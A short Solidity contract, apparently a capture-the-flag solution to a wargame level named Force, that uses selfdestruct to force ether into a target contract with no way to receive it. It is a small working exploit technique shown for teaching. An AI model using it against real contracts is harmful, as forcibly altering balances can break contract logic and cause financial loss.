// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
  constructor() payable {

  }
  
  function attack(address _forceAddress) external {
    selfdestruct(payable(_forceAddress));
  }


}